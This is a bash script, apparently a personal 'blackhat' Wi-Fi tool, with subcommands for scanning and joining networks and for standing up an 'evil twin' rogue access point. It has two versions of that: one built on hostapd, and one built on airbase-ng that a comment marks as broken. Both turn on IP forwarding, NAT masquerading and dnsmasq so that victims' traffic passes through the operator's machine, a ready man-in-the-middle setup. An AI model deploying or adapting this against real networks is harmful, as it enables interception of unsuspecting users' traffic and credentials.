#!/bin/bash

CONFIG_F=blackhat.conf

if test -f $CONFIG_F; then
	CONFIG_F=$(pwd)/$CONFIG_F
	LOG_F=blackhat.log
	echo "Loaded Config From: $CONFIG_F"
elif test -f /etc/$CONFIG_F; then 
	CONFIG_F=/etc/blackhat.conf
	LOG_F=/var/log/blackhat.log
	echo "Loaded Config From: $CONFIG_F"
else
	echo "Could not load conf file"
	exit
fi

source $CONFIG_F 
rm $LOG_F 2>/dev/null

function print_help() {
	echo "Usage: bh [subcommand] [options]"
	echo "Subcommands:"
	echo "  list_wifi       List _2G_ WiFi Networks"
	echo "  connect_wifi    Connect to a WiFi network"
	echo "Options for connect_wifi:"
	echo "  -p    Specify the password for the WiFi network"
	echo "  -s    Specify the SSID for the WiFi network"
}

function connect_wifi() {
	wpa_supplicant -B -i $1 -c <(wpa_passphrase $SSID $PASS)
}

## Havn't been able to get this working
function evil_twin_airbase() {
	ip link set $RADIO_AP down
	iw dev $RADIO_AP set monitor none
	airmon-ng start $RADIO_AP
	airbase-ng -e $AP_SSID -c 11 $RADIO_AP 2>&1 > $LOG_F &
	while ! grep -q "Access Point with BSSID" $LOG_F; do
		sleep 1
	done
	connect_wifi $RADIO_CLIENT
	ip link set at0 up
	ip addr add 192.168.99.1/24 dev at0
	route add -net 192.168.99.0 netmask 255.255.255.0 gw 192.168.99.1
	iptables -P FORWARD ACCEPT
	iptables -t nat -A POSTROUTING -o $RADIO_CLIENT -j MASQUERADE
	echo 1 > /proc/sys/net/ipv4/ip_forward

	# sed -i "/^interface=/c\interface=$RADIO_AP" /etc/dnsmasq.conf
	kill $(pidof dnsmasq)
	dnsmasq -C /etc/dnsmasq.conf -d 2>&1 >> $LOG_F & 
}

function evil_twin() {
	ip link set $RADIO_AP down
	ip addr add 192.168.99.1/24 dev $RADIO_AP
	iptables --table nat --append POSTROUTING --out-interface $RADIO_CLIENT -j MASQUERADE
	iptables --append FORWARD --in-interface $RADIO_AP -j ACCEPT
	echo 1 > /proc/sys/net/ipv4/ip_forward

	hostapd /etc/hostapd.conf &
	connect_wifi $RADIO_CLIENT

	kill $(pidof dnsmasq)
	dnsmasq -C /etc/dnsmasq.conf -d 2>&1 > $LOG_F & 
}

function set() {
	case "$1" in
		SSID)
			sed -i "/^SSID=/c\SSID=$2" ${CONFIG_F}	
			;;
		AP)
			sed -i "/^AP=/c\AP=$2" ${CONFIG_F}	
			;;
		*)
			print_help
	esac
}

function wifi() {
	case "$1" in
		list)
			iw $RADIO_CLIENT scan | grep "SSID:"
			;;
		connect)
			ip link set $RADIO_CLIENT up
			connect_wifi $RADIO_CLIENT
			;;
		*)
			print_help
	esac
}


subcommand=$1; shift  
case "$subcommand" in
	set)
		set "$@"
		;;
	get)
		cat $CONFIG_F
		;;
	wifi)
		wifi "$@"
		;;
	evil_twin)
		evil_twin
		;;
	evil_twin_airbase)
		evil_twin_airbase
		;;
	help)
		print_help
		;;
	*)
		print_help
		;;
esac
